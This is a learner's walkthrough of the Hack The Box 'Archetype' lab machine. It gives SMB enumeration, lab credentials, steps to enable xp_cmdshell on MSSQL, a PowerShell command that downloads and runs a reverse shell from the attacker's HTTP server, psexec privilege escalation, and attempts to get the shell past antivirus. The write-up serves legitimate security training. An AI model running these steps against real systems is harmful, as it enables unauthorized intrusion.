## Archetype (my first box)

1. Connect to openvpn

2. Join Machine

3. Ping the IP

4. nmap -sC -sV -Pn MY_IP

   - Port 445 Open

      - Windows SMB File Sharing Server

      - https://searchsecurity.techtarget.com/answer/Detecting-and-defending-against-TCP-port-445-attacks./

   - Port 1433 Open

        - MSSQL Server

        - https://docs.microsoft.com/en-us/sql/sql-server/install/configure-the-windows-firewall-to-allow-sql-server-access?view=sql-server-ver15

5. smbclient -N -L \\\\\\\\MY_IP\\\

	- [How to use?](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

   - SMB (Server Message Block) is a network protocol to share files

   - smbclient is a tool to browse files shared on SMB

6. DTS Config file is for [SQL Server](https://secinject.wordpress.com/2020/10/20/hack-the-box-archetype-writeup/)

   - USERID: ARCHETYPE\sql_svc

   - PASSWORD: M3g4c0rp123

7. Connect to MSSQL server with credentials

   - Can use `locate` to find stuff on Kali Linux

   - `locate mssqlclient`

   - python3 /path/to/mssqlclient.py USER_ID@PUBLIC_IP -windows-auth

8. Check for sysadmin privileges

   - SELECT IS_SRVROLEMEMBER ('sysadmin')
   
      - TRUE if no output

      - FALSE if "NULL" output

9. Configure the SQL server to allow us to run powershell scripts
   
   - `sp_configure;` list current configuration
   
   - `EXEC sp_configure "SERVICE", STATUS` to change service configuration
   
   - `reconfigure;` reconfigures SQL settings based on changes 
   
   - enable 'show advanced options' via `EXEC sp_configure "Show Advanced Options", 1`
   
   - enable 'xp_cmdshell' via `EXEC sp_configure "xp_cmdshell", 1`
   
      - Allows you to run powershell scripts in MSSQL

      - `xp_cmdshell echo "Hello World"` will print out Hello World on to the SQL cli

10. Use a reverse TCP powershell script

    - [Used this one](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

      - Change the port to 443

      - Change the IP to tun0 IP

11. Set up a python http server in the directory of the reverse TCP powershell

    - `python3 -m http.server 80`

12. Set up netcat listener on port 443

    - `nc -lvnp 443`  

13. Run powershell via xp_cmdshell to download the reverse TCP shell 

    ```
    xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
    ```

    - On the window with python server, you would get logs downloading the power shell

    - On the window with nc listener, you would receive a connection and connect to the host as sql_svc

      - Press ENTER key to continue as sql_svc host

14. Now we have user access, can navigate to `C:\Users\sql_svc\Desktop` directory and grab user flag

15. We need to escalate privileges and get root privileges

16. Check PowerShell history

    - https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html

    - `type /path/to/console_host_history.txt` 

      ```
      type
      C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Console
      Host_history.txt
      ```

17. Purpose of [Net Use](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)), command maps resource using administrator credentials

    - username: administrator

    - password: MEGACORP_4dm1n!!

28. Run psexec.py to get a privileged shell

    `psexec.py administrator@10.10.10.27`

### 3 main issues encountered:

1. Antivirus caught the reverse TCP powershell script

   - Guessing the anti-virus on Archetype recognizes the shell script?

   - Modify original shell script to make it unrecognizable?

      - Added the import statement which was missing in **point 2**.
   
   - From reddit, it seems to be the way I formatted the powershell script
   
      - I went and reformat the powershell script
     
      - https://www.reddit.com/r/hackthebox/comments/lwl1tm/archetypestuck_on_netcat/
     
      - Hence just copy and paste directly
   
   - From HTB Forums, a work around seems to be modifying the script itself
     
      - https://forum.hackthebox.eu/discussion/4496/archetype-antivirus-blocking-reverse-shell
     
      - Added `(pwd).PATH to (pwd)` but seems to produce the same results
   
2. The 'New-Object' command was found in the module 'Microsoft.PowerShell.Utility', but the module could not be loaded  
   
   - From HTB, import the module that cant be loaded, AKA 'Microsoft.PowerShell.Utility'
   
   - https://forum.hackthebox.eu/discussion/3410/starting-point-foothold-powershell-problem
   
   - `Import-Module Microsoft.PowerShell.Utility;`
   
   - On the SQL CLI, you can also run `xp_cmdshell powershell Import-Module Microsoft.PowerShell.Utility`
   
   - I added the above command to the powershell script
   
3. Kali Linux denies all incoming traffic and allow outgoing traffic by default
   
   - Need to implicitly allow incoming traffic at the particular port
   
   - applicable for other boxes moving forward
   
   - https://askubuntu.com/questions/1121172/what-happens-if-ufw-firewall-is-inactive
   
   - https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-with-ufw-on-ubuntu-18-04
   
   - `sudo ufw allow from 10.10.10.27 proto tcp to any port 80, 443`
   
4. IP that reverse shell connects to/NC watches for on port 443
   
   - Use private IP not public (duh, also because via VPN, the box should be able to see you)
   
   - `curl ifconfig.me` for Public IP
   
   - `ifconfig` for Private IP, look at inet
   
      - Will have 2 under eth0 and tun0 (these are network interfaces)
     
         - https://superuser.com/questions/1100815/et0-vs-tun0-with-openvpn
       
         - Use tun0's private IP for the above scripts, eth0 will not work (linked to openvpn)

### Methodology:

- NMAP

- Googling what the open ports indicate
   
- Enumerating SMB Server
   
- Linking the files found on server to SQL server
   
- Misconfiguring SQL server
   
- Running a reverse shell
   
- Get the USER flag
   
- Finding out the frequently accessed files
   
- Linking the credentials found to obtaining root privileges
   
- Get the ROOT flag

### Useful Links:

- https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
   
- https://secinject.wordpress.com/2020/10/20/hack-the-box-archetype-writeup/ (In depth write up, different tools used!)


